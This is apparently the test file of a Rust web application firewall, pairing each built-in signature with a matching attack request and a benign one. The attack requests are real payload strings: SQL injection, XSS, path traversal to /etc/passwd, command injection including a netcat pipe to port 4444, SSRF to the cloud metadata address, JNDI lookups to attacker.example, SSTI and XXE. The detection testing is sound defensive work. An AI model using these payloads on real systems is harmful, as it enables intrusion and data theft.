//! The built-in signatures: one positive and one negative example each.

use std::net::{IpAddr, Ipv4Addr};

use http::{HeaderMap, HeaderName, HeaderValue, Method};
use rstest::rstest;

use super::UA;
use crate::error::ConfigError;
use crate::rules::builtin::position;
use crate::rules::{RuleInput, builtin_rules, matching};

/// Runs the built-in rules over one request and returns the id of the first rule that matches.
pub(crate) fn builtin_hit(
    method: &str,
    path: &str,
    query: Option<&str>,
    headers: &[(&str, &str)],
    body: &[u8],
) -> Option<String> {
    let method = Method::from_bytes(method.as_bytes()).unwrap_or(Method::GET);
    let mut map = HeaderMap::new();
    for (name, value) in headers {
        if let (Ok(name), Ok(value)) = (
            HeaderName::from_bytes(name.as_bytes()),
            HeaderValue::from_bytes(value.as_bytes()),
        ) {
            map.append(name, value);
        }
    }
    let client = IpAddr::V4(Ipv4Addr::new(192, 0, 2, 1));
    let input = RuleInput::new(&method, path, query, &map, body, client);
    let rules = builtin_rules().unwrap_or(&[]);
    matching::first_match(rules, &input).map(|rule| rule.id.to_string())
}

/// One request that must trigger `id`, and one ordinary request that must not.
struct Example {
    id: &'static str,
    method: &'static str,
    path: &'static str,
    query: Option<&'static str>,
    headers: &'static [(&'static str, &'static str)],
    body: &'static [u8],
    negative: (&'static str, Option<&'static str>, &'static [u8]),
}

const EXAMPLES: &[Example] = &[
    Example {
        id: "vh-sqli-001",
        method: "GET",
        path: "/item",
        query: Some("id=1%20UNION%20SELECT%20username"),
        headers: UA,
        body: b"",
        negative: ("/item", Some("q=european+selection"), b""),
    },
    Example {
        id: "vh-sqli-002",
        method: "GET",
        path: "/item",
        query: Some("id=' or 1=1--"),
        headers: UA,
        body: b"",
        negative: ("/item", Some("name=O'Brien"), b""),
    },
    Example {
        id: "vh-sqli-003",
        method: "GET",
        path: "/item",
        query: Some("x=%27;drop%20table%20users"),
        headers: UA,
        body: b"",
        negative: ("/item", Some("note=done;drop-off"), b""),
    },
    Example {
        id: "vh-sqli-004",
        method: "GET",
        path: "/item",
        query: Some("id=1' and sleep(5)--"),
        headers: UA,
        body: b"",
        negative: ("/item", Some("msg=please sleep(well)"), b""),
    },
    Example {
        id: "vh-xss-001",
        method: "GET",
        path: "/search",
        query: Some("q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"),
        headers: UA,
        body: b"",
        negative: ("/search", Some("q=%3Cb%3Ebold%3C%2Fb%3E"), b""),
    },
    Example {
        id: "vh-xss-002",
        method: "GET",
        path: "/go",
        query: Some("next=javascript:alert(1)"),
        headers: UA,
        body: b"",
        negative: ("/go", Some("next=/home"), b""),
    },
    Example {
        id: "vh-xss-003",
        method: "GET",
        path: "/search",
        query: Some("q=<img src=x onerror=alert(1)>"),
        headers: UA,
        body: b"",
        negative: ("/search", Some("q=<img src=logo.png>"), b""),
    },
    Example {
        id: "vh-traversal-001",
        method: "GET",
        path: "/files",
        query: Some("file=..%252F..%252Fetc"),
        headers: UA,
        body: b"",
        negative: ("/files", Some("page=2&sort=asc"), b""),
    },
    Example {
        id: "vh-traversal-002",
        method: "GET",
        path: "/download",
        query: Some("file=etc/passwd"),
        headers: UA,
        body: b"",
        negative: ("/etc-guide/passwordless", None, b""),
    },
    Example {
        id: "vh-traversal-003",
        method: "GET",
        path: "/static/..;/etc/passwd",
        query: None,
        headers: UA,
        body: b"",
        negative: ("/static/etc-guide/passwordless", None, b""),
    },
    Example {
        id: "vh-cmdi-001",
        method: "GET",
        path: "/run",
        query: Some("cmd=a;cat /etc/hosts"),
        headers: UA,
        body: b"",
        negative: ("/run", Some("q=cat;dog"), b""),
    },
    Example {
        id: "vh-cmdi-002",
        method: "GET",
        path: "/run",
        query: Some("x=$(id)"),
        headers: UA,
        body: b"",
        negative: ("/run", Some("price=$5 (approx)"), b""),
    },
    Example {
        id: "vh-cmdi-003",
        method: "GET",
        path: "/run",
        query: Some("x=`id`"),
        headers: UA,
        body: b"",
        negative: ("/run", Some("x=`code` sample"), b""),
    },
    Example {
        id: "vh-lfi-001",
        method: "POST",
        path: "/upload",
        query: None,
        headers: UA,
        body: b"url=php://filter/convert.base64-encode/resource=index",
        negative: ("/upload", None, b"see the php docs"),
    },
    Example {
        id: "vh-lfi-002",
        method: "GET",
        path: "/img",
        query: Some("src=data:text/html;base64,PHNjcmlwdD4="),
        headers: UA,
        body: b"",
        negative: ("/img", Some("src=data-driven"), b""),
    },
    Example {
        id: "vh-lfi-003",
        method: "GET",
        path: "/run",
        query: Some("x=expect://id"),
        headers: UA,
        body: b"",
        negative: ("/run", Some("x=expectation"), b""),
    },
    Example {
        id: "vh-lfi-004",
        method: "GET",
        path: "/view",
        query: Some("page=https://evil.example/shell.txt"),
        headers: UA,
        body: b"",
        negative: ("/view", Some("page=2"), b""),
    },
    Example {
        id: "vh-ssrf-001",
        method: "GET",
        path: "/fetch",
        query: Some("url=http://169.254.169.254/latest/meta-data/"),
        headers: UA,
        body: b"",
        negative: ("/fetch", Some("url=http://169.254.1.1/"), b""),
    },
    Example {
        id: "vh-ssrf-002",
        method: "GET",
        path: "/fetch",
        query: Some("u=gopher://127.0.0.1:6379/_"),
        headers: UA,
        body: b"",
        negative: ("/fetch", Some("u=https://example.com/"), b""),
    },
    Example {
        id: "vh-expr-001",
        method: "GET",
        path: "/",
        query: None,
        headers: &[("user-agent", "${jndi:ldap://attacker.example/a}")],
        body: b"",
        negative: ("/", None, b""),
    },
    Example {
        id: "vh-expr-002",
        method: "GET",
        path: "/",
        query: Some("t={{7*7}}"),
        headers: UA,
        body: b"",
        negative: ("/", Some("t={{name}}"), b""),
    },
    Example {
        id: "vh-expr-003",
        method: "GET",
        path: "/",
        query: Some("class.module.classLoader.resources=1"),
        headers: UA,
        body: b"",
        negative: ("/", Some("class=module"), b""),
    },
    Example {
        id: "vh-xxe-001",
        method: "POST",
        path: "/xml",
        query: None,
        headers: UA,
        body: b"<!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
        negative: ("/xml", None, b"<!DOCTYPE html><html></html>"),
    },
    Example {
        id: "vh-scanner-001",
        method: "GET",
        path: "/",
        query: None,
        headers: &[("user-agent", "sqlmap/1.7.2#stable")],
        body: b"",
        negative: ("/", None, b""),
    },
    Example {
        id: "vh-cve-2026-9103",
        method: "GET",
        path: "/api/v1/login/auto_login",
        query: None,
        headers: UA,
        body: b"",
        negative: ("/api/v1/login", None, b""),
    },
    Example {
        id: "vh-cve-2026-8481",
        method: "POST",
        path: "/api/v1/validate/code",
        query: None,
        headers: UA,
        body: b"{\"code\": \"import os\"}",
        negative: ("/api/v1/validate/prompt", None, b""),
    },
];

#[test]
fn every_built_in_rule_has_a_positive_and_a_negative_example() -> Result<(), ConfigError> {
    let shipped: Vec<String> = builtin_rules()?
        .iter()
        .map(|rule| rule.id.to_string())
        .collect();
    let covered: Vec<String> = EXAMPLES
        .iter()
        .map(|example| example.id.to_owned())
        .collect();
    assert_eq!(
        shipped, covered,
        "every built-in rule needs an example, in order"
    );
    Ok(())
}

#[test]
fn built_in_rules_match_their_positive_examples() {
    for example in EXAMPLES {
        let hit = builtin_hit(
            example.method,
            example.path,
            example.query,
            example.headers,
            example.body,
        );
        assert_eq!(
            hit.as_deref(),
            Some(example.id),
            "positive example of {}",
            example.id
        );
    }
}

#[test]
fn built_in_rules_leave_their_negative_examples_alone() {
    for example in EXAMPLES {
        let (path, query, body) = example.negative;
        let hit = builtin_hit(example.method, path, query, UA, body);
        assert_eq!(hit, None, "negative example of {}", example.id);
    }
}

/// A parameter whose name starts with a command name is not a command: the command
/// must be followed by whitespace, the end of the value, or a shell separator.
#[rstest]
#[case::id_parameter_with_dash("x=1&id-from=3")]
#[case::cat_parameter_with_dash("x=1&cat-name=x")]
#[case::nc_parameter_with_dash("x=1&nc-mode=1")]
#[case::command_name_inside_a_longer_word("x=1&identity=2")]
fn a_parameter_named_after_a_command_is_not_a_command_injection(#[case] query: &str) {
    let hit = builtin_hit("GET", "/run", Some(query), UA, b"");
    assert_ne!(hit.as_deref(), Some("vh-cmdi-001"), "{query}");
}

/// The command is still caught when it ends the value, or is followed by a space or a separator.
#[rstest]
#[case::at_the_end_of_the_value("x=1&id")]
#[case::followed_by_a_space("x=1;cat -n /etc/hosts")]
#[case::after_a_pipe_followed_by_a_host("x=1|nc 10.0.0.1 4444")]
#[case::followed_by_a_semicolon("x=1&sh;ls")]
fn a_shell_command_is_still_caught(#[case] query: &str) {
    let hit = builtin_hit("GET", "/run", Some(query), UA, b"");
    assert_eq!(hit.as_deref(), Some("vh-cmdi-001"), "{query}");
}

/// Ordinary text that a fixed-width signature must not match: SQL and HTML discussed in prose,
/// a code paste, a base64 blob, Japanese text and a relative link.
#[rstest]
#[case::sql_in_a_forum_post(
    "POST",
    "/forum/post",
    None,
    b"body=To+get+rows+use+SELECT+*+FROM+users+WHERE+id+%3D+1%3B+-- done".as_slice()
)]
#[case::union_in_prose("POST", "/blog", None, b"comment=UNION+SELECT+is+a+SQL+keyword".as_slice())]
#[case::html_in_a_post("POST", "/comment", None, b"comment=%3Cb%3Ehi%3C%2Fb%3E+%3Cscript%3E+is+a+tag".as_slice())]
#[case::code_paste_with_sleep("POST", "/code", None, b"code=setTimeout(() => sleep(1000), 0);".as_slice())]
#[case::base64_blob("POST", "/upload", None, b"data=iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==".as_slice())]
#[case::japanese_text("POST", "/contact", None, "message=こんにちは、ユニオンの選択について質問です。".as_bytes())]
#[case::relative_link("POST", "/post", None, b"text=see+../images/logo.png+for+details".as_slice())]
#[case::etc_in_prose("GET", "/docs", Some("q=where+is+etc+passwd+stored"), b"".as_slice())]
fn ordinary_text_matches_no_built_in_rule(
    #[case] method: &str,
    #[case] path: &str,
    #[case] query: Option<&str>,
    #[case] body: &[u8],
) {
    assert_eq!(builtin_hit(method, path, query, UA, body), None);
}

#[test]
fn a_syntax_error_in_the_built_in_file_is_reported_at_its_line_and_message() {
    let error = ConfigError::Syntax {
        file: "builtin.conf".to_owned(),
        line: 7,
        message: "bad token".to_owned(),
    };
    assert_eq!(position(error), (7, "bad token".to_owned()));
}

#[test]
fn a_read_error_in_the_built_in_file_is_reported_on_line_one() {
    let error = ConfigError::Read {
        path: std::path::PathBuf::from("builtin.conf"),
        source: std::io::Error::other("boom"),
    };
    let (line, message) = position(error);
    assert_eq!(line, 1);
    assert!(message.contains("boom"), "{message}");
}
